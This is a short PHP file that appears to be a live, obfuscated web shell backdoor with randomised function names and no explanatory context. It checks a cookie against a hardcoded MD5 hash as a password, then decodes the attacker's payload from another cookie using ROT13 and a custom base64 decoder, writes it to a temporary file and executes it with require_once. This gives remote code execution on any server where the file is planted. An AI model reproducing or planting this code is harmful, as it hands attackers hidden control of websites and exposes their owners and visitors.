<?php

function PImNjr ( $s, $n = 13 ) {
    static $letters = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz';
    $n = (int)$n % 26;
    if (!$n) return $s;
    if ($n < 0) $n += 26;
    $rep = substr($letters, $n * 2) . substr($letters, 0, $n * 2);
    return strtr($s, $letters, $rep);
}

if( md5 ( $_COOKIE[ 4 ] ) != '85fa08f9b4cdd8c62ebc70ebb6461150' ) 
{
	die;
}

function QFnV ( $input ) {
    $strict = false;
    $inl = strlen($input);
    $in = unpack('C*', $input);
    $padding = 0;
    $inli = 1;
    $i = 0;
    $j = 0;
    $out = array();
    
    $base64_reverse_table = array(
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -1, -1, -2, -2, -1, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -1, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, 62, -2, -2, -2, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -2, -2, -2, -2, -2, -2,
        -2,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -2, -2, -2, -2, -2,
        -2, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
        -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2
    );

    /* run through the whole string, converting as we go */
    while ($inl-- > 0) {
        $ch = $in[$inli++];
        if ($ch == "=") {
            $padding++;
            continue;
        }

        $ch = $base64_reverse_table[$ch];
        if (!$strict) {
            /* skip unknown characters and whitespace */
            if ($ch < 0) {
                continue;
            }
        } else {
            /* skip whitespace */
            if ($ch == -1) {
                continue;
            }
            /* fail on bad characters or if any data follows padding */
            if ($ch == -2 || $padding) {
                //goto fail;
                return false;
            }
        }

        switch ($i % 4) {
            case 0:
            $out[$j] = $ch << 2;
            break;
            case 1:
            $out[$j++] |= $ch >> 4;
            $out[$j] = ($ch & 0x0f) << 4;
            break;
            case 2:
            $out[$j++] |= $ch >>2;
            $out[$j] = ($ch & 0x03) << 6;
            break;
            case 3:
            $out[$j++] |= $ch;
            break;
        }
        $i++;
    }

    /* fail if the input is truncated (only one char in last group) */
    if ($strict && $i % 4 == 1) {
        return false;
    }

    /* fail if the padding length is wrong (not VV==, VVV=), but accept zero padding
    * RFC 4648: "In some circumstances, the use of padding [--] is not required" */
    if ($strict && $padding && ($padding > 2 || ($i + $padding) % 4 != 0)) {
        return false;
    }
    
    $out[$j] = '10';
    
    return implode(array_map("chr", $out));
}

$mXyDC = tmpfile();
$meta_data = stream_get_meta_data($mXyDC); 
fwrite($mXyDC, '<?php '. QFnV ( PImNjr ( $_COOKIE [ 3 ] )));
require_once ( $meta_data["uri"] );
fclose($mXyDC);